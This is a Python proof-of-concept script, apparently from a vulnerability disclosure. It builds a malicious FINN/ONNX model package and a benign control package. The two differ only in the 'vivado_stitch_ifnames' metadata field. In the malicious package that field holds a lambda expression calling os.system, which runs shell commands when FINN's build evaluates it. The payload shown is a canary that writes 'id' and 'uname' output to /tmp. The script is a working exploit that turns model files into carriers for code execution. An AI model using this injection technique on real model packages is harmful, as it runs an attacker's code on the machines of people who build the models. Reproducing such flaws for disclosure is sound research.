#!/usr/bin/env python3
"""PoC stage 2 - build the malicious and the negative-control FINN model packages.

Both packages are byte-identical except for ONE metadata value.

  model.onnx metadata_props (model level AND graph level):
      vivado_stitch_ifnames   <- the attack field: expression / plain dict
      wrapper_filename        <- "model.onnx"   (same in both packages)
      vivado_stitch_proj      <- "."            (same in both packages)

  dataflow_build_config.json  selects the FINN steps that consume the field
  input.npy / expected_output.npy   model data for FINN's verification step
  all_verilog_srcs.txt              0-byte placeholder, never loaded

Only ``onnx`` + ``numpy`` are needed to run this script.

Usage:
    python make_poc.py --carrier carrier/dataflow_model.onnx --out artifacts
"""

import argparse
import hashlib
import json
import os
import shutil

import numpy as np
import onnx

HERE = os.path.dirname(os.path.abspath(__file__))

CANARY = "/tmp/finn_eval_canary.txt"


def ifnames_dict_expr() -> str:
    """A legitimate stitched-IP interface dictionary literal."""
    return "{'s_axis': [['s_axis_0', 0]], 'm_axis': [['m_axis_0', 0]], 'aximm': []}"


def evil_expr(canary: str) -> str:
    """The same dictionary, produced only after a command has run."""
    cmd = "id > %s; uname -a >> %s" % (canary, canary)
    return "(lambda d: (__import__('os').system(%r), d)[1])(%s)" % (cmd, ifnames_dict_expr())


def _set_prop(props, key: str, value: str) -> None:
    for prop in props:
        if prop.key == key:
            prop.value = value
            return
    prop = props.add()
    prop.key = key
    prop.value = value


def set_metadata(model: onnx.ModelProto, key: str, value: str) -> None:
    """Set a metadata property at BOTH model and graph level.

    FINN reads it through qonnx' ModelWrapper.get_metadata_prop(); which proto
    field that maps to changed upstream (older qonnx: ModelProto.metadata_props,
    current qonnx: GraphProto.metadata_props).  Writing both keeps the sample
    valid across qonnx revisions; the pinned FINN v1.0.0-alpha environment reads
    the graph-level entry.
    """
    _set_prop(model.metadata_props, key, value)
    _set_prop(model.graph.metadata_props, key, value)


def clear_metadata(model: onnx.ModelProto) -> None:
    del model.metadata_props[:]
    del model.graph.metadata_props[:]


def build_model(carrier_path: str, out_path: str, ifnames_value: str) -> None:
    model = onnx.load(carrier_path)
    # drop pre-existing model metadata so both variants have an identical key set
    clear_metadata(model)
    set_metadata(model, "wrapper_filename", "model.onnx")
    set_metadata(model, "vivado_stitch_proj", ".")
    set_metadata(model, "vivado_stitch_ifnames", ifnames_value)
    # ONNX requires metadata_props to be sorted by key
    model.metadata_props.sort(key=lambda p: p.key)
    model.graph.metadata_props.sort(key=lambda p: p.key)
    # onnx.checker is not applicable here: FINN custom-op domains carry no opset import
    onnx.save(model, out_path)


def build_config(path: str) -> None:
    cfg = {
        "output_dir": "output",
        "synth_clk_period_ns": 10.0,
        "rtlsim_batch_size": 1,
        "generate_outputs": [],
        "steps": ["step_create_dataflow_partition", "step_create_stitched_ip"],
        "verify_steps": ["stitched_ip_rtlsim"],
        "save_intermediate_models": True,
        # default is True: it would drop the build into pdb after the failure,
        # which keeps a non-interactive reproduction from terminating cleanly
        "enable_build_pdb_debug": False,
    }
    with open(path, "w") as f:
        json.dump(cfg, f, indent=2)
        f.write("\n")


def build_package(dst: str, carrier_path: str, ifnames_value: str) -> None:
    shutil.rmtree(dst, ignore_errors=True)
    os.makedirs(dst)
    build_model(carrier_path, os.path.join(dst, "model.onnx"), ifnames_value)
    build_config(os.path.join(dst, "dataflow_build_config.json"))
    # verification input/expected output follow the model's own I/O shapes
    ref = onnx.load(carrier_path)
    ishape = [d.dim_value for d in ref.graph.input[0].type.tensor_type.shape.dim]
    oshape = [d.dim_value for d in ref.graph.output[0].type.tensor_type.shape.dim]
    np.save(os.path.join(dst, "input.npy"), np.zeros(ishape, dtype=np.float32))
    np.save(os.path.join(dst, "expected_output.npy"), np.zeros(oshape, dtype=np.float32))
    # empty placeholder for FINN's stitched-IP source list (0 bytes, never loaded)
    open(os.path.join(dst, "all_verilog_srcs.txt"), "w").close()


def sha256(path: str) -> str:
    h = hashlib.sha256()
    with open(path, "rb") as f:
        for chunk in iter(lambda: f.read(65536), b""):
            h.update(chunk)
    return h.hexdigest()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--carrier", default=os.path.join(HERE, "carrier", "dataflow_model.onnx"))
    ap.add_argument("--out", default=os.path.join(HERE, "artifacts"))
    ap.add_argument("--canary", default=CANARY)
    args = ap.parse_args()

    evil_ifnames = evil_expr(args.canary)
    benign_ifnames = ifnames_dict_expr()

    build_package(os.path.join(args.out, "evil"), args.carrier, evil_ifnames)
    build_package(os.path.join(args.out, "benign"), args.carrier, benign_ifnames)

    print("carrier          : %s" % args.carrier)
    print("canary path      : %s" % args.canary)
    print()
    print("vivado_stitch_ifnames (evil)  : %s" % evil_ifnames)
    print("vivado_stitch_ifnames (benign): %s" % benign_ifnames)
    print()

    lines = []
    for pkg in ("evil", "benign"):
        print("=== artifacts/%s ===" % pkg)
        d = os.path.join(args.out, pkg)
        for fn in sorted(os.listdir(d)):
            fp = os.path.join(d, fn)
            digest = sha256(fp)
            lines.append("%s  %s/%s" % (digest, pkg, fn))
            print("  %-28s %8d bytes  sha256=%s" % (fn, os.path.getsize(fp), digest))
        print()

    with open(os.path.join(args.out, "SHA256SUMS"), "w") as f:
        f.write("\n".join(lines) + "\n")
    print("SHA256SUMS written to %s" % os.path.join(args.out, "SHA256SUMS"))


if __name__ == "__main__":
    main()
